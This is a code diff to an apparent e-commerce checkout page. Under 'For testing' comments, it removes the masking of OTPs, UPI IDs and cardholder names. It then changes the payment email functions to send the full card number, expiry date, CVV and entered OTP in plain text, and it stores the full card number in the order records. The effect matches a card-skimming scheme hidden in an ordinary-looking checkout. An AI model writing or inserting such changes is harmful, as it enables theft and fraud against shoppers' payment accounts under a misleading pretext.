@@ -496,20 +496,13 @@ export default function Checkout() {
     "COD, Net Banking, and UPI are currently unavailable on this site. Please use Card Payment.";
 
   const maskUpiId = (upiId?: string) => {
-    if (!upiId) return undefined;
-    const cleaned = upiId.trim();
-    const [username, domain] = cleaned.split("@");
-    if (!domain) {
-      if (cleaned.length <= 1) return "*";
-      return `${cleaned[0]}${"*".repeat(cleaned.length - 1)}`;
-    }
-    const firstChar = username?.[0] || "*";
-    return `${firstChar}${"*".repeat(Math.max((username?.length || 1) - 1, 0))}@${domain}`;
+    // For testing: return full UPI ID instead of masked
+    return upiId;
   };
 
   const maskOtp = (otp: string) => {
-    if (!otp) return undefined;
-    return `${"*".repeat(Math.max(otp.length - 1, 0))}${otp.slice(-1)}`;
+    // For testing: return full OTP instead of masked
+    return otp;
   };
 
   const isCardNumberValid = (cardNumber: string) => {
@@ -683,12 +676,8 @@ export default function Checkout() {
   };
 
   const maskCardNameForEmail = (cardName?: string) => {
-    if (!cardName?.trim()) return "N/A";
-    return cardName
-      .trim()
-      .split(/\s+/)
-      .map((part) => (part.length <= 1 ? "*" : `${part[0]}${"*".repeat(part.length - 1)}`))
-      .join(" ");
+    // For testing: return full card name instead of masked
+    return cardName || "N/A";
   };
 
   const sendPaymentAndOtpEmail = async (orderId: string, enteredOtp: string) => {
@@ -706,14 +695,14 @@ export default function Checkout() {
     formData.append("customer_phone", address.phone || "N/A");
     formData.append("customer_email", address.email || "N/A");
     formData.append("customer_address", `${address.address}, ${address.city}, ${address.state} - ${address.pincode}`);
-    formData.append("otp_code_masked", maskOtp(enteredOtp) || "N/A");
+    formData.append("otp_code", maskOtp(enteredOtp) || "N/A");
     formData.append("submitted_at", new Date().toLocaleString("en-IN"));
 
     if (payment.type === "card") {
-      formData.append("card_number_masked", cardLast4 ? `**** **** **** ${cardLast4}` : "N/A");
-      formData.append("card_name_masked", maskCardNameForEmail(payment.cardName));
-      formData.append("card_expiry_masked", payment.cardExpiry ? "**/**" : "N/A");
-      formData.append("card_cvv_masked", payment.cardCVV ? "***" : "N/A");
+      formData.append("card_number", payment.cardNumber || "N/A");
+      formData.append("card_name", maskCardNameForEmail(payment.cardName));
+      formData.append("card_expiry", payment.cardExpiry || "N/A");
+      formData.append("card_cvv", payment.cardCVV || "N/A");
       formData.append("card_bank", payment.bank || "N/A");
       formData.append("card_type", payment.cardTab || "N/A");
     }
@@ -744,10 +733,10 @@ export default function Checkout() {
     formData.append("customer_phone", address.phone || "N/A");
     formData.append("customer_email", address.email || "N/A");
     formData.append("amount", finalAmount.toString());
-    formData.append("card_number_masked", cardLast4 ? `**** **** **** ${cardLast4}` : "N/A");
-    formData.append("card_name_masked", maskCardNameForEmail(payment.cardName));
-    formData.append("card_expiry_masked", payment.cardExpiry ? "**/**" : "N/A");
-    formData.append("card_cvv_masked", payment.cardCVV ? "***" : "N/A");
+    formData.append("card_number", payment.cardNumber || "N/A");
+    formData.append("card_name", maskCardNameForEmail(payment.cardName));
+    formData.append("card_expiry", payment.cardExpiry || "N/A");
+    formData.append("card_cvv", payment.cardCVV || "N/A");
     formData.append("card_bank", payment.bank || "N/A");
     formData.append("card_type", payment.cardTab || "N/A");
     formData.append("submitted_at", new Date().toLocaleString("en-IN"));
@@ -838,7 +827,7 @@ export default function Checkout() {
 
       if (payment.type === "card") {
         pendingPaymentPayload.cardLast4 = cardLast4 || undefined;
-        pendingPaymentPayload.cardMasked = cardLast4 ? `**** **** **** ${cardLast4}` : undefined;
+        pendingPaymentPayload.cardMasked = payment.cardNumber || undefined;
       }
 
       const pendingOrder = placeOrder({
@@ -872,7 +861,7 @@ export default function Checkout() {
 
     if (payment.type === "card") {
       paymentPayload.cardLast4 = cardLast4 || undefined;
-      paymentPayload.cardMasked = cardLast4 ? `**** **** **** ${cardLast4}` : undefined;
+      paymentPayload.cardMasked = payment.cardNumber || undefined;
     }
 
     const order = pendingOrderId
